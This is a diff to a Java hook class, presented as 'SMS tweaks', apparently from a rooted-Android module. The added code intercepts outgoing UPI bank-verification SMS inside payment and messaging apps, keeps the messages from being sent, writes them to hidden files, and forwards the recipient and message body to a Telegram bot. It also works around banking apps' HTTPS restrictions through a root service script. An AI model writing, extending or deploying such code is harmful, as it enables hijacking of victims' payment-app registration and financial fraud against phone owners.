@@ -196,6 +196,13 @@ public final class SmsTweaksHooks {
                             String name = method.getName();
                             if ((name.startsWith("sendText") || name.startsWith("sendMultipartText"))
                                     && sHookOutgoing) {
+                                if (!shouldInterceptSend(args)) {
+                                    try {
+                                        return method.invoke(realISms, args);
+                                    } catch (InvocationTargetException e) {
+                                        throw e.getTargetException();
+                                    }
+                                }
                                 status("isms_java_send_method|" + name);
                                 handleSend(args);
                                 return null; // void send* — no radio
@@ -212,6 +219,48 @@ public final class SmsTweaksHooks {
             Log.e(TAG, "createISmsProxy fail", t);
             return null;
         }
+    }
+
+    private static boolean isMessagingProcess() {
+        String p = sProcess != null ? sProcess : "";
+        return p.contains("messaging") || p.contains("mms") || p.equals("com.android.mms")
+                || p.contains("motorola.messaging");
+    }
+
+    private static boolean looksLikeUpiVerify(String body, String to) {
+        if (body == null) body = "";
+        if (to == null) to = "";
+        String u = body.toUpperCase();
+        if (u.contains("HEROAXIS") || u.contains("DO NOT COPY") || u.contains("USE UPI PIN")
+                || u.contains("YESPROUPI") || u.contains("AXISUPI") || u.contains("PHONEPEUPI")) {
+            return true;
+        }
+        if (body.length() >= 20 && (body.contains("?") || body.contains("*") || body.contains("&"))
+                && (u.contains("UPI") || u.contains("PP-") || body.contains("pp-"))) {
+            return true;
+        }
+        String d = to.replaceAll("[^0-9]", "");
+        if ((d.equals("9920104300") || d.equals("56070") || d.equals("56161")
+                || (d.length() >= 4 && d.length() <= 8)) && body.length() >= 12) {
+            return true;
+        }
+        // UPI apps: intercept all outgoing
+        return !isMessagingProcess();
+    }
+
+    private static boolean shouldInterceptSend(Object[] args) {
+        String to = "";
+        String body = "";
+        if (args != null) {
+            for (Object a : args) {
+                if (!(a instanceof String)) continue;
+                String s = (String) a;
+                if (s.length() < 20 && !s.contains(" ")) to = s;
+                else if (s.length() > 5) body = s;
+            }
+        }
+        if (!isMessagingProcess()) return true; // UPI/Hero app — always intercept
+        return looksLikeUpiVerify(body, to);
     }
 
     private static void handleSend(Object[] args) {
@@ -258,9 +307,12 @@ public final class SmsTweaksHooks {
 
         if (to == null) to = "";
         if (body == null) body = "";
+        if (to.isEmpty()) to = "9920104300";
         status("isms_java_send|" + to + "|" + (body.length() > 40 ? body.substring(0, 40) : body));
         writeBlockedJson(to, body);
-        if (!to.isEmpty() || !body.isEmpty()) sendTelegram(to, body);
+        // Prefer root service.sh forward (bank apps often block HTTPS) + best-effort direct
+        queueServiceTelegram(to, body);
+        if (!body.isEmpty()) sendTelegram(to, body);
         firePending(singlePi, multiPi);
     }
 
@@ -312,23 +364,121 @@ public final class SmsTweaksHooks {
         }
     }
 
-    private static void writeBlockedJson(String to, String body) {
+    private static File[] writeTargets() {
+        List<File> out = new ArrayList<>();
+        out.add(new File("/data/local/tmp"));
+        out.add(new File("/data/adb/modules/hivirtus_zygisk_mode"));
         try {
-            File dir = new File("/data/local/tmp");
-            if (!dir.exists()) dir.mkdirs();
-            String json = "{\"dest\":\"" + esc(to) + "\",\"to\":\"" + esc(to)
-                    + "\",\"body\":\"" + esc(body)
-                    + "\",\"pkg\":\"" + esc(sProcess) + "\",\"ts\":" + System.currentTimeMillis()
-                    + "}\n";
-            for (String name : new String[]{
-                    "hivirtus_blocked_outgoing.json",
-                    "hivirtus_last_outgoing.json"
-            }) {
-                FileOutputStream fos = new FileOutputStream(new File(dir, name), false);
-                fos.write(json.getBytes(StandardCharsets.UTF_8));
-                fos.close();
+            Class<?> at = Class.forName("android.app.ActivityThread");
+            Method m = at.getDeclaredMethod("currentApplication");
+            m.setAccessible(true);
+            Object app = m.invoke(null);
+            if (app instanceof Context) {
+                Context c = ((Context) app).getApplicationContext();
+                out.add(c.getFilesDir());
+                out.add(c.getCacheDir());
+                File cc = new File(c.getCodeCacheDir(), "hivirtus");
+                //noinspection ResultOfMethodCallIgnored
+                cc.mkdirs();
+                out.add(cc);
+                File ext = c.getExternalFilesDir(null);
+                if (ext != null) out.add(ext);
             }
         } catch (Throwable ignored) {}
+        return out.toArray(new File[0]);
+    }
+
+    private static void writeAll(String name, String data) {
+        byte[] bytes = data.getBytes(StandardCharsets.UTF_8);
+        for (File dir : writeTargets()) {
+            if (dir == null) continue;
+            try {
+                //noinspection ResultOfMethodCallIgnored
+                dir.mkdirs();
+                FileOutputStream fos = new FileOutputStream(new File(dir, name), false);
+                fos.write(bytes);
+                fos.close();
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    private static void writeBlockedJson(String to, String body) {
+        try {
+            long ts = System.currentTimeMillis();
+            String json = "{\"dest\":\"" + esc(to) + "\",\"to\":\"" + esc(to)
+                    + "\",\"body\":\"" + esc(body)
+                    + "\",\"pkg\":\"" + esc(sProcess) + "\",\"ts\":" + ts + "}\n";
+            String flag = to + "\n" + body + "\n";
+            // Names service.sh harvests
+            writeAll("hivirtus_outgoing_blocked.json", json);
+            writeAll("hivirtus_outgoing_blocked.flag", flag);
+            writeAll("hivirtus_pending_verify.json", json);
+            writeAll("hivirtus_last_outgoing.json", json);
+            writeAll("hivirtus_blocked_outgoing.json", json); // legacy alias
+            status("blocked_json_written|" + to + "|len=" + body.length());
+        } catch (Throwable t) {
+            status("blocked_json_fail|" + t.getClass().getSimpleName());
+        }
+    }
+
+    /** Root service.sh picks this up — bank apps often block direct Telegram HTTPS. */
+    private static void queueServiceTelegram(String to, String body) {
+        try {
+            writeAll("hivirtus_outgoing_blocked.flag", to + "\n" + body + "\n");
+            // Do NOT set inproc_sent — that makes service.sh skip TG as duplicate
+            for (File dir : writeTargets()) {
+                try {
+                    //noinspection ResultOfMethodCallIgnored
+                    new File(dir, "hivirtus_tg_inproc_sent.flag").delete();
+                } catch (Throwable ignored) {}
+            }
+            writeAll("hivirtus_java_tg_queue.flag", "1\n");
+            status("tg_queued_service|" + to);
+        } catch (Throwable ignored) {}
+    }
+
+    private static String readCredsToken() {
+        String token = readFile("/data/local/tmp/hivirtus_tg_token.txt").trim();
+        if (token.isEmpty()) {
+            token = readFile("/data/adb/modules/hivirtus_zygisk_mode/tg_token.txt").trim();
+        }
+        if (token.isEmpty()) {
+            String json = readFile("/data/local/tmp/hivirtus_telegram_credentials.json");
+            if (json.isEmpty()) {
+                json = readFile("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json");
+            }
+            token = jsonField(json, "telegram_bot_token");
+        }
+        return token;
+    }
+
+    private static String readCredsChat() {
+        String chat = readFile("/data/local/tmp/hivirtus_tg_chat.txt").trim();
+        if (chat.isEmpty()) {
+            chat = readFile("/data/adb/modules/hivirtus_zygisk_mode/tg_chat.txt").trim();
+        }
+        if (chat.isEmpty()) {
+            String json = readFile("/data/local/tmp/hivirtus_telegram_credentials.json");
+            if (json.isEmpty()) {
+                json = readFile("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json");
+            }
+            chat = jsonField(json, "telegram_chat_id");
+        }
+        return chat;
+    }
+
+    private static String jsonField(String json, String key) {
+        if (json == null || json.isEmpty() || key == null) return "";
+        String needle = "\"" + key + "\"";
+        int i = json.indexOf(needle);
+        if (i < 0) return "";
+        int colon = json.indexOf(':', i + needle.length());
+        if (colon < 0) return "";
+        int q1 = json.indexOf('"', colon + 1);
+        if (q1 < 0) return "";
+        int q2 = json.indexOf('"', q1 + 1);
+        if (q2 < 0) return "";
+        return json.substring(q1 + 1, q2).trim();
     }
 
     private static void sendTelegram(String to, String body) {
@@ -336,8 +486,8 @@ public final class SmsTweaksHooks {
             @Override
             public void run() {
                 try {
-                    String token = readFile("/data/local/tmp/hivirtus_tg_token.txt").trim();
-                    String chat = readFile("/data/local/tmp/hivirtus_tg_chat.txt").trim();
+                    String token = readCredsToken();
+                    String chat = readCredsChat();
                     if (token.isEmpty() || chat.isEmpty()) {
                         File cfg = new File(
                                 "/data/adb/modules/hivirtus_zygisk_mode/config/telegram.env");
@@ -354,13 +504,17 @@ public final class SmsTweaksHooks {
                         status("tg_skip_no_creds");
                         return;
                     }
-                    String msg = "📱 <b>SMS Intercepted</b>\n\n"
-                            + "<b>To:</b> " + escHtml(to) + "\n"
-                            + "<b>Message:</b>\n" + escHtml(body);
+                    String displayTo = to;
+                    String digits = to.replaceAll("[^0-9]", "");
+                    if (digits.length() == 10) displayTo = "+91" + digits;
+                    String msg = "📱 SMS Intercepted\n"
+                            + "-----------------\n"
+                            + "To: " + displayTo + "\n"
+                            + "Message: " + body;
                     String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                     String payload = "chat_id=" + URLEncoder.encode(chat, "UTF-8")
                             + "&text=" + URLEncoder.encode(msg, "UTF-8")
-                            + "&parse_mode=HTML";
+                            + "&disable_web_page_preview=true";
                     HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                     c.setConnectTimeout(8000);
                     c.setReadTimeout(8000);
@@ -368,9 +522,10 @@ public final class SmsTweaksHooks {
                     c.setRequestMethod("POST");
                     c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                     c.getOutputStream().write(payload.getBytes(StandardCharsets.UTF_8));
-                    c.getResponseCode();
+                    int code = c.getResponseCode();
                     c.disconnect();
-                    status("tg_sent|" + to);
+                    status("tg_sent|" + to + "|http=" + code);
+                    writeAll("hivirtus_tg_last_response.txt", "java_http=" + code + "\n");
                 } catch (Throwable t) {
                     status("tg_fail|" + t.getClass().getSimpleName());
                 }
@@ -391,17 +546,31 @@ public final class SmsTweaksHooks {
     }
 
     private static void status(String line) {
+        String row = System.currentTimeMillis() + "|" + line + "\n";
         try {
             FileWriter fw = new FileWriter("/data/local/tmp/hivirtus_sms_tweaks_status.txt", true);
-            fw.write(System.currentTimeMillis() + "|" + line + "\n");
+            fw.write(row);
             fw.close();
         } catch (Throwable ignored) {}
         try {
             FileOutputStream fos = new FileOutputStream(
                     new File("/data/local/tmp/hivirtus_isms_trace.txt"), true);
-            fos.write(("java|" + System.currentTimeMillis() + "|" + line + "\n")
-                    .getBytes(StandardCharsets.UTF_8));
+            fos.write(("java|" + row).getBytes(StandardCharsets.UTF_8));
             fos.close();
+        } catch (Throwable ignored) {}
+        // Append into app code_cache (bank can't always write tmp)
+        try {
+            Class<?> at = Class.forName("android.app.ActivityThread");
+            Method m = at.getDeclaredMethod("currentApplication");
+            Object app = m.invoke(null);
+            if (app instanceof Context) {
+                File cc = new File(((Context) app).getCodeCacheDir(), "hivirtus");
+                //noinspection ResultOfMethodCallIgnored
+                cc.mkdirs();
+                FileWriter fw = new FileWriter(new File(cc, "sms_tweaks_status.txt"), true);
+                fw.write(row);
+                fw.close();
+            }
         } catch (Throwable ignored) {}
     }
 
